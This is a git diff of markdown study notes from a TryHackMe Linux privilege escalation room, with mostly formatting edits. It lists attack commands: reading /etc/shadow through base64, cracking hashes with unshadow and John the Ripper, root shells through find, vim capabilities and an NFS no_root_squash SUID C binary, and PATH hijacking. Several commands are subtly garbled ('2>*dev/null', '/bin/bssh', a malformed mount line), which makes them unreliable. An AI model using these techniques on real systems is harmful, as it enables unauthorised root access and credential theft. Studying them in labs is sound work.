@@ -16,7 +16,6 @@ description: My notes from the THM Linux Privilege Escalation room
 title: Linux Privilege Escalation
 ---
 ## Contents
-### Table of contents
 
 <!-- toc -->
 
@@ -42,6 +41,7 @@ Make sure to look at the Exploit DB once system information has been gathered - 
 ### Useful Commands
 
 Some useful commands once access to a machine has been gained:
+
 - `hostname` - can provide some information about the target's role within the organisation
 - `uname -a` - provides information about the target's system such as the kernal; useful for searching for vulnerabilities
 - `cat /proc/version` - provides information about the target's operating system such as kernal version and compilers installed (e.g. GCC)
@@ -53,14 +53,16 @@ Some useful commands once access to a machine has been gained:
 - `id` - shows the user ID and group ID of the current user
 - `cat /etc/passwd` - list all users on the target; better examples below:
 
-``` bash
+```bash
 cat /etc/passwd | cut -d ":" -f 1
 ```
+
 {: .nolineno }
 
-``` bash
+```bash
 cat /etc/passwd | grep home
 ```
+
 {: .nolineno }
 
 - `history` - command history, may have passwords or usernames
@@ -95,6 +97,7 @@ cat /etc/passwd | grep home
 ## Automated Enumeration Tools
 
 Links to various enumeration tools that are well worth learning to use:
+
 - [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 - [LinEnum](https://github.com/rebootuser/LinEnum)
 - [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) - LES
@@ -103,135 +106,151 @@ Links to various enumeration tools that are well worth learning to use:
 
 ## Get The Fuck Out Bins
 
-[GTFOBins](https://gtfobins.github.io) - legitimate functions of Unix binaries to break out of restrictive shells, escalate or maintain elevated privileges, etc. 
+[GTFOBins](https://gtfobins.github.io) - legitimate functions of Unix binaries to break out of restrictive shells, escalate or maintain elevated privileges, etc.
 Example of an awesome line that will grant sudo shell access:
 
-``` bash
+```bash
 find . -exec /bin/sh \; -quit
 ```
+
 {: .nolineno }
 
 ## Cat Alternative
 
 Excellent way to `cat` a file if privilege does not allow use of cat; try `base64` in the following way:
 
-``` bash
+```bash
 base64 /etc/shadow | base64 -d
 ```
+
 {: .nolineno }
 
 ## Check for SUID/GUID
 
 Use the command below to see what files have the SUID or GUID bit set:
 
-``` bash
+```bash
 find / -type f -perm -04000 -ls 2>/dev/null
 ```
+
 {: .nolineno }
 
-Good practice is to compare the executables from the generated list with GTFOBins. Check for things like `base64` and `nano` when `cat` returns permission denied. 
+Good practice is to compare the executables from the generated list with GTFOBins. Check for things like `base64` and `nano` when `cat` returns permission denied.
 
 ## Unshadow
 
-Use the `unshadow` tool with *John the Ripper* to crack passwords from the `/etc/shadow` file and the `/etc/passwd` file.
+Use the `unshadow` tool with _John the Ripper_ to crack passwords from the `/etc/shadow` file and the `/etc/passwd` file.
 
-``` bash
+```bash
 unshadow passwd.txt shadow.txt >passwords.txt
 ```
+
 {: .nolineno }
 
-``` bash
+```bash
 john --wordlist=/usr/shares/wordlists/rockyou.txt passwords.txt
 ```
+
 {: .nolineno }
 
 > I have recently compared the performance of _John the Ripper_ with _Hashcat_ on my MBP. I cannot believe how damned fast _Hashcat_ is compared to _John_. Whenever I can, in future I shall always be using _Hashcat_ as a first choice. It blasted _John_ out of the water. In one test it cracked a BCrypt hash in seconds compared to _John_ taking what felt like a lifetime. If you're a fan of _John_ and have not really looked at _Hashcat_, I recommend you do.
-{: .prompt-tip }
+> {: .prompt-tip }
 
 ## Capabilities
 
 Use of _capabilities_ can be extremely useful for getting root privileges
 
-``` bash
+```bash
 getcap -r / 2>/dev/null
 ```
+
 {: .nolineno }
 
 The above command will show which executables have elevated capabilities. Use the list to check on GTFOBins for any binaries that may be vulnerable. Example for vim:
 
-``` bash
+```bash
 ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 ```
+
 {: .nolineno }
 
 ## Find Writable Folders
 
 When finding writable folders, the output can be very long. Use the following to tidy up the output:
 
-``` bash
+```bash
 find / -writable 2>*dev/null | cut -d "*" -f 2 | sort -u
 ```
+
 {: .nolineno }
 
 Followed by something like...
 
-``` bash
+```bash
 find / -writable 2>*dev/null | grep usr | cut -d "*" -f 2,3 | sort -u
 ```
+
 {: .nolineno }
 
 or
 
-``` bash
+```bash
 find / -writable 2>*dev/null | cut -d "*" -f 2,3 | grep -v proc | sort -u
 ```
+
 {: .nolineno }
 
 ## Path Env Variable
 
 Add writable folders to the `$PATH` environment variable:
 
-``` bash
+```bash
 export PATH=$PATH:*home*<user>
 ```
+
 {: .nolineno }
 
-or 
+or
 
-``` bash
+```bash
 export PATH=$PATH:/tmp
 ```
+
 {: .nolineno }
 
 ## Enumerate mountable network shares
 
-``` bash
+```bash
 showmount -e <target_ip>
 ```
+
 {: .nolineno }
 
 - Choose a "no_root_squash" folder to mount to from a temp folder:
 
-``` bash
+```bash
 mkdir /tmp/temp
 ```
+
 {: .nolineno }
 
-``` bash
+```bash
 mount -o rw /tmp/temp <target_ip >:/tmp
 ```
+
 {: .nolineno }
 
 ## Create and Compile
 
 Create and compile an executable and then set the SUID bit
 
-``` bash
+```bash
 vim nfs.c
 ```
+
 {: .nolineno }
 
-``` c
+```c
 int main()
 { setgid(0);
 setuid(0);
@@ -239,16 +258,18 @@ system("/bin/bssh");
 return 0;
 }
 ```
+
 {: .nolineno }
 
-``` bash
+```bash
 gcc nfs.c -o nfs -w
 ```
+
 {: .nolineno }
 
-``` bash
+```bash
 chmod +s nfs
 ```
-{: .nolineno }
 
+{: .nolineno }
 
